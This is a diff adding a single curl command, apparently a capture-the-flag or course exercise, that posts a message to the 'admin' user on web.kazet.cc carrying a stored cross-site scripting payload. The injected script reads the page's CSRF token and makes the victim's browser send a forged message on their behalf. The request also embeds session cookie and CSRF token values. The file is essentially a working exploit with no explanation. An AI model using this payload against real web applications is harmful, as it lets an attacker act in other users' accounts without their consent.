@@ -1,0 +1,34 @@
+curl --location 'https://web.kazet.cc:42448/create' \
+--header 'Cookie: csrftoken=hUx4TMjd7B88OhRkIsJtffjObqkChtcu; sessionid=9535cp80pn54a5j8q6wb4pil4heyd2a7' \
+--header 'Content-Type: application/x-www-form-urlencoded' \
+--data-urlencode 'csrfmiddlewaretoken=JRTI1VYVPScNc9qS0mobBuYh2s0FCl4QQBgCKx7YMjaLQg72yEXuGz7V3Ia7JE6a' \
+--data-urlencode 'recipient=admin' \
+--data-urlencode 'content=<script>
+async function fetchDataAndPost() {
+  try {
+    const response = await fetch("https://web.kazet.cc:42448/create");
+    if (!response.ok) throw new Error(`Failed to fetch the page. Status: ${response.status}`);
+    const csrfToken = new DOMParser().parseFromString(await response.text(), "text/html").querySelector("input")?.value;
+
+    if (csrfToken) {
+      const formData = new URLSearchParams({csrfmiddlewaretoken: csrfToken, recipient: "hubi", content: "%3Cp%3Edsaasddsa%3C%2Fp%3E", template: "normal"});
+      const postResponse = await fetch("https://web.kazet.cc:42448/create", { method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: formData });
+
+      if (postResponse.ok) {
+        console.log("POST request successful.");
+      } else {
+        throw new Error(`POST request failed. Status: ${postResponse.status}`);
+      }
+    } else {
+      throw new Error("Unable to fetch the CSRF token.");
+    }
+  } catch (error) {
+    console.error("An error occurred:", error);
+  }
+}
+
+// Call the function to make the POST request
+fetchDataAndPost();
+
+</script>' \
+--data-urlencode 'template=normal'
